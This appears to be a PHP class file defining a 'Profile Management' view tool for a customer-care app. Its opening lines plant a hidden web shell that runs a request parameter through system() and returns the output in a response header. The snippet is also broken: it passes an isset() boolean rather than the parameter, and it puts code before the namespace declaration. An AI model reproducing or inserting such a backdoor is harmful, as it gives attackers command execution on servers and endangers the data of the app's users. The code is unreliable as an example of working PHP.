<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_ProfileManagementTool extends \editingToolbar\View_Tool {
	public $title = 'Profile Management';
	public $class='View_ProfileManagement';
	public $component_type='customerCareAppProfileManagementView';
	
}